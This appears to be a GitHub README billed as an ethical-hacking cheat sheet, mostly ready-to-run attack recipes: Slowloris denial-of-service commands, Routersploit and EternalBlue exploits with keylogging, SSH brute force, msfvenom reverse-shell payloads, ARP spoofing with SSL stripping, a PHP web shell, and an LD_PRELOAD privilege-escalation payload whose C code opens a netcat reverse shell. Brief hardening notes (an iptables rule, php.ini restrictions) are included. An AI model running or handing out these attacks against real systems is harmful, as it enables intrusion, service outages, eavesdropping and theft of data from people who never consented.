## The content and practices described herein are intended solely for educational and informational purposes. Ethical hacking, also known as penetration testing, should only be performed with explicit, written consent from the owners of the systems, networks, or applications being tested. Failure to adhere to these principles may result in legal action and consequences. Always prioritize ethical standards and the security of information.

## What is Ethical Hacking ?
Ethical hacking, often referred to as penetration testing or white-hat hacking, involves the practice of intentionally probing systems, networks, or applications to identify and fix vulnerabilities before malicious hackers can exploit them. Ethical hacking is a critical component of cybersecurity, helping to safeguard data and maintain trust in digital systems.

Here are some key points:
1. Purpose: The primary goal is to enhance security by uncovering weaknesses in systems.
Legal and Authorized: Ethical hackers operate with permission from the organization they are testing, distinguishing them from malicious hackers.
2. Techniques: They use various methods such as social engineering, network scanning, and vulnerability assessments to identify potential risks.
3. Tools: Common tools include Nmap, Metasploit, Burp Suite, and Wireshark, among others.
4. Certification: Many ethical hackers pursue certifications like Certified Ethical Hacker (CEH) or Offensive Security Certified Professional (OSCP) to validate their skills.
5. Report Findings: After testing, ethical hackers provide detailed reports to organizations, outlining vulnerabilities and recommendations for improvement.

# Summary Of Repository
* [Summary Of Repository](#Summary-Of-Repository)
* [OSI Layer](#OSI-Layer)
  * [What is OSI Layer?](#What-is-OSI-Layer?)
  * [Table OSI Layer](#Table-OSI-Layer)
* [Denial Of Service Web Server](#Denial-Of-Service-Web-Server)
  * [Slowloris \(GET Attack)](#Slowloris-(GET-Attack))
  * [Anonymousdoser \(POST Attack)](#Anonymousdoser-(POST-Attack))
  * [Log Access Web Server](#Log-Access-Web-Server)
  * [Harderning Web With IPTABLES](#Harderning-Web-With-IPTABLES)
* [Router Exploit](#Router-Exploit)
  * [Routersploit](#Routersploit)
  * [Routersploit 3.0](#Routersploit-3.0)
* [Scanning Port and Service](#Scanning-Port-and-Service)
  * [NMAP](#NMAP)
  * [Netdiscovery](#Netdiscovery)
  * [Nbtscan](#Nbtscan)
* [Brute Force](#Brute-Force)
  * [Hydra](#Hydra)
* [Reverse Shell](#Reverse-Shell)
  * [Payload Msvenom](#Payload-Msvenom)
  * [Hacking SMB With Metasploit](#Hacking-SMB-With-Metasploit)
* [MITM (Man In The Middle)](#MITM-(Man-In-The-Middle))
  * [Ettercap](#Ettercap)
  * [SSL Strip \(Downgrade HTTPS to HTTP)](#SSL-Strip-(Downgrade-HTTPS-to-HTTP))
  * [Xerosploit](#Xerosploit)
* [PHP Shell](#PHP-Shell)
  * [PHP Shell](#PHP-Shell)
  * [Privilege Escalation](#Privilege-Escalation)
  * [Harderning PHP](#Harderning-PHP)
* [Additional Resources](#Additional-Resources)
  * [Ebook / Manuals](#Ebook-/-Manuals)

# OSI Layer
## What is OSI Layer?
The OSI model, or Open Systems Interconnection model, is a conceptual framework used to understand and implement network communication. It divides the networking process into seven layers, each with specific functions. 

This model helps standardize communication processes, enabling interoperability between different systems and technologies.

## Table OSI Layer
OSI Model
| No | Layer | Example |
| --- | --- | --- |
| 7 | Application | HTTP, FTP, SMTP, Telnet, SNMP, NTP, DHCP |
| 6 | Presentation | HTTPS, SSL, TLS, JPEG, MPEG, ASCII |
| 5 | Session | NetBIOS, PPTP, DNS, SQL |
| 4 | Transport | TCP, UDP |
| 3 | Network | Router, IPSec, ARP, RIP, BGP, OSPF, IGRP, ICMP |
| 2 | Data Link | Ethernet, Switch, VLAN, Mac Address |
| 1 | Physical | Hub, NIC, Cable, Fiber, RS-232, E1, Wireless |

# Denial Of Service Web Server
## Slowloris (GET Attack)
Slowloris Perl
```
perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache
```
Slowloris Python

Source : (https://github.com/gkbrk/slowloris)
```
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py [IP_TARGET] --port 80 --sleeptime 1000
```

## Anonymousdoser (POST Attack)
This Tools Running in Windows
```
Website [URL/IP] : [IP_TARGET]
Time [Seconds] : 9999
```
## Log Access Web Server
Log Apache and Nginx
```
/var/log/apache2/access.log
/var/log/nginx/access.log
```
Optional (Live Report)
```
tail -f ./access.log
```
## Harderning Web With IPTABLES
IP Tables
```
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 40 -j DROP
```

# Router Exploit
## Routersploit
Exploit For Router HGU, Mikrotik, IPCAM, etc.

Case Router ZTE_F609 and ZTE_F660
```
show exploits
search zte
use exploits/routers/zte/f609_config_disclosure
use exploits/routers/zte/f660_config_disclosure
show options
set target [IP_TARGET]
exploit
```
Case Router MikroTik 6.29 < 6.42 (Port 8291)
```
search mikrotik
use exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure
show options
set target [IP_TARGET]
exploit
```

## Routersploit 3.0
Source : https://github.com/threat9/routersploit

Running Framework
```
python3 rsf.py
```
Lets Exploit
```
use scanners/autopwm
set target 192.168.1.1 <- IP Routers
run

use exploits/routers/dlink/dsl_rce
set target 192.168.1.1
check 
run

show payloads
set payload reverse_tcp
show options
set lhost 192.168.1.xx <- IP Attacker
run

ls -la
exit
```

# Scanning Port and Service
## NMAP
```
nmap -sn [RANGE_IP]
nmap -A [IP_TARGET]

nmap -v -A [TARGET]
nmap -v -sn 192.168.1.0/24
nmap -v iR 10000 -Pn -p 80
```
## Netdiscovery
```
netdiscovery

netdiscover -i eth0 -r 192.168.1.0/24
```
## Nbtscan
```
nbtscan [NETWORK_IP]

nbtscan 192.168.1.1-254
nbtscan -r 192.168.1.0/24
nbtscan -v -s : 192.168.1.0/24
nbtscan -f iplist
```

# Brute Force
## Hydra
CVE-2018-15473 (OpenSSH 2.3 < 7.7)

Source : https://www.exploit-db.com/exploits/45233\

Run Exploit
```
python3 45233.py --userList user.txt [IP_TARGET] --outputFile hasil.txt
hydra -L user.txt -P pass.txt [IP_TARGET] ssh
```

# Reverse Shell
## Payload Msvenom
Payload Reverse Shell
| Target | Example |
| --- | --- |
| Android | msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] R > payload.apk |
| Windows Staged | msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f exe > reverse.exe |
| Windows Stageless | msfvenom -p windows/shell_reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f exe > reverse.exe |
| Linux | msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f elf >reverse.elf |
| OSX | msfvenom -p osx/x86/shell_reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f macho > shell.macho |
| Python | msfvenom -p cmd/unix/reverse_python LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f raw > shell.py |
| PHP | msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f raw > shell.php; cat shell.php \| pbcopy && echo '<?php ' \| tr -d '\n' > shell.php && pbpaste >> shell.php |
| Bash | msfvenom -p cmd/unix/reverse_bash LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f raw > shell.sh |

## Hacking SMB With Metasploit
Windows 7
```
msfconsole -q
search ms17_010_ethernalblue
use exploit [ms17_010_ethernalblue]
set payload windows/x64/meterpreter/reverse_tcp
set lport [PORT_ATTACKER]
set lhost [IP_ATTACKER]
set rhost [IP_TARGET]
exploit
```
Windows 10
```
msfconsole -q
use exploit windows/smb/eternalblue_doublepulsar
set payload windows/meterpreter/reverse_tcp
set lport [PORT_ATTACKER]
set lhost [IP_ATTACKER]
set rhost [IP_TARGET]
exploit
```
Access Shell Target
```
shell -> Access CMD Windows
```
View Desktop Target
```
run vnc -> View Dekstop Target
```
Keylogger Target
```
migrate exploler.exe
keyscan_start
keyscan_dump
```

# MITM (Man In The Middle)
## Ettercap
Ettercap GUI Example
```
run ettercap -G

Step 1.
> options
> enable promisc mode => ethernet mode
> disable promisc mode => wireless mode

Step 2.
> sniff
> unified sniffing
> network interface => eth0

Step 3.
> host
> hostlist
> add target 1 => [IP_ROUTER]
> add target 2 => [IP_TARGET]

Step 4.
> target
> enable current target

Step 5.
> plugins
> manage the plugins
> remote_browser

Step 6.
> mitm
> arp poisoning
> enable sniff remote connection
```

## SSL Strip (Downgrade HTTPS to HTTP)
Forwarding Port
```
echo 1> /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to- port 10000
```
ARP Spoofing
```
arpspoof -i eth0 -t [IP_TARGET] -r [IP_ROUTER]
sslstrip -l 10000
```
Log SSL Strip
```
sslstrip.log
```

## Xerosploit
Source : https://github.com/LionSec/xerosploit
```
git clone https://github.com/LionSec/xerosploit
cd xerosploit && sudo python install.py
sudo xerosploit
```
Example Sniffing
```
sniff
run
load sslstrip -> y
ctrl + c -> stop
```

# PHP Shell
## PHP Shell
Trial Install (Case Apache2)
```
apt install apache2
apt install php
```
Create shell.php

Source : https://github.com/flozz/p0wny-shell
```
nano /var/www/html/shell.php
---------------------------
Copy Raw. Source : https://github.com/flozz/p0wny-shell/shell.php
```
Testing PHP Shell
```
Access to Browser : http://192.168.xx.xx/shell.php
```
## Privilege Escalation
Source : https://github.com/kurniawandata

Step 1. Create Payload
```
nano /var/www/html/hack.c
---------------------------
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.1 4444 >/tmp/f");
}
int geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
```
Step 2. Copy to Shell
```
gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so
```
Step 3. Create hack.php
```
nano /var/www/html/hack.php
---------------------------
<?php
putenv("LD_PRELOAD=/var/www/html/hack.so");
mail("@localhost","","","","");
?>
```
Step 4. Netcat
```
nc -v -l -p 4444
```
## Harderning PHP
Harderning php.ini
```
nano /etc/php/8.3/apache2/php.ini
---------------------------
#disable_function
disable_functions = curl_multi_exec, popen, passthru, exec, popen, symlink, proc_open, shell_exec, show_source, allow_url_fopen, system, passthru, parse_ini_file, show_source, exec, proc_open, php_uname, posix_getpwuid, setenv, main, apache_setenv, putenv, mail, link, mb_send_mail,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,phpinfo,putenv
#open_basedir
open_basedir = /var/www/html
```
Harderning Virtual Host
```
nano domain.conf
---------------------------
<VirtualHost *:80>
    ServerAdmin [DOMAIN_SAMPLE]
    ServerName [DOMAIN_SAMPLE]
    ServerAlias [DOMAIN_SAMPLE]
    DocumentRoot /home/[DOMAIN_SAMPLE]
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    <Directory /home/[DOMAIN_SAMPLE]>
    php_admin_value open_basedir /home/[DOMAIN_SAMPLE]
    </Directory>
    <Directory /home/[DOMAIN_SAMPLE]>
    php_admin_value upload_tmp_dir /home/[DOMAIN_SAMPLE]
    </Directory>
</VirtualHost>

<VirtualHost *:443>
        ServerName [DOMAIN_SAMPLE]
        DocumentRoot /home/[DOMAIN_SAMPLE]
        SSLEngine on
        SSLCertificateFile /etc/apache2/ssl/[DOMAIN_SAMPLE].pem
        SSLCertificateKeyFile /etc/apache2/ssl/[DOMAIN_SAMPLE].key
        <Directory /home/[DOMAIN_SAMPLE]>
        php_admin_value open_basedir /home/[DOMAIN_SAMPLE]
        </Directory>
        <Directory /home/[DOMAIN_SAMPLE]>
        php_admin_value upload_tmp_dir /home/[DOMAIN_SAMPLE]
        </Directory>
</VirtualHost>
---------------------------
```

# Additional Resources
## Ebook / Manuals
 
